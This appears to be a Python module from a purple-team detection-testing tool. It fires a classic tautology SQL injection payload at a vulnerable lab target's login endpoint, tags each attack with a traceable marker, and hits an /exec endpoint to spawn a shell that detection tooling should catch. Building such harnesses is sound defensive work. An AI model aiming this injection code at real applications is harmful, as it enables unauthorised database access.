"""程式化發動一次 SQLi 攻擊。

票 02a 第一條：不靠人手打 curl。這裡也解決一個 02b／03 會用到的問題 ——
每次攻擊帶一個唯一 `attack_id`，讓後面產生的 Core Event 能追回是哪一次攻擊。
"""

from __future__ import annotations

import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from dataclasses import dataclass, field

#: 經典的恆真注入。夠明顯，任何像樣的偵測規則都該抓到 —— 這正是重點：
#: 載具要打出「應該被偵測到」的攻擊，才能驗證偵測缺口。
DEFAULT_PAYLOAD = "' OR '1'='1"

DEFAULT_TIMEOUT_S = 5.0


class AttackFailed(Exception):
    """攻擊連請求都送不出去。與「送出了但沒被偵測」是兩回事，不可混為一談。"""


@dataclass(frozen=True)
class AttackResult:
    attack_id: str
    url: str
    method: str
    payload: str
    status_code: int
    elapsed_ms: float
    marker: str = field(compare=False, default="")
    #: 這次攻擊實現的**已註冊**動作（#90 Phase 1）。`None` 代表這是一次不計分的
    #: 探測，不是「忘了填」——計分路徑一律要求呼叫端明寫。
    action_id: str | None = None


def make_marker(attack_id: str, action_id: str | None = None) -> str:
    """埋進 payload 的可追蹤標記。用 SQL 註解語法，讓它在多數靶機上無害地被吞掉。

    帶 `action_id` 時一併埋進去：raw 遙測因此自帶關聯鍵，Evaluation 不必靠
    技法＋時間窗猜這行 log 屬於哪個動作（#90 的關聯契約）。
    """
    if action_id:
        return f"-- purple:{attack_id} action:{action_id}"
    return f"-- purple:{attack_id}"


def inject_sqli(
    base_url: str,
    path: str = "/login",
    param: str = "username",
    payload: str = DEFAULT_PAYLOAD,
    timeout_s: float = DEFAULT_TIMEOUT_S,
    opener: urllib.request.OpenerDirector | None = None,
    action_id: str | None = None,
) -> AttackResult:
    """對 base_url+path 送一次帶 SQLi payload 的 GET，回傳可追蹤的結果。

    刻意不要求回應成功：靶機是脆弱的，重點在注入送達，不在它回什麼。
    連請求都送不出去（連線被拒、逾時）才是失敗，會拋 AttackFailed。

    `action_id` 是這次攻擊實現的註冊動作；給了就會埋進 marker，讓後續遙測與
    Core Event 帶得回同一個關聯鍵。
    """
    attack_id = uuid.uuid4().hex
    marker = make_marker(attack_id, action_id)
    injected = f"{payload} {marker}"
    query = urllib.parse.urlencode({param: injected})
    url = f"{base_url.rstrip('/')}{path}?{query}"

    request = urllib.request.Request(url, method="GET")
    send = opener.open if opener is not None else urllib.request.urlopen

    start = time.monotonic()
    try:
        with send(request, timeout=timeout_s) as response:
            status = response.status
    except urllib.error.HTTPError as exc:
        # 4xx/5xx 仍算送達 —— 靶機收到了請求並回了錯，注入本身成功。
        status = exc.code
    except (urllib.error.URLError, OSError, TimeoutError) as exc:
        raise AttackFailed(f"SQLi 請求送不出去 {url!r}: {exc}") from exc
    elapsed_ms = (time.monotonic() - start) * 1000

    return AttackResult(
        attack_id=attack_id,
        url=url,
        method="GET",
        payload=injected,
        status_code=status,
        elapsed_ms=elapsed_ms,
        marker=marker,
        action_id=action_id,
    )


def trigger_exec(
    base_url: str,
    timeout_s: float = DEFAULT_TIMEOUT_S,
    opener: urllib.request.OpenerDirector | None = None,
) -> str:
    """打靶機 /exec：讓它在容器內生一個帶 PURPLESCOPE_EXEC 標記的 shell 直譯器。

    這是 T1059（Command and Scripting Interpreter）的可觸發代表動作 —— execve 會被
    target 側的 Falco（modern-eBPF）抓到，寫進 Loki（票 #9 / Slice 2b-②）。
    回傳 app 的回應（`executed PURPLESCOPE_EXEC_<n>`）。送不出去才拋 AttackFailed。
    """
    url = f"{base_url.rstrip('/')}/exec"
    request = urllib.request.Request(url, method="GET")
    send = opener.open if opener is not None else urllib.request.urlopen
    try:
        with send(request, timeout=timeout_s) as response:
            return response.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        raise AttackFailed(f"/exec 回錯 {exc.code}") from exc
    except (urllib.error.URLError, OSError, TimeoutError) as exc:
        raise AttackFailed(f"/exec 送不出去 {url!r}: {exc}") from exc
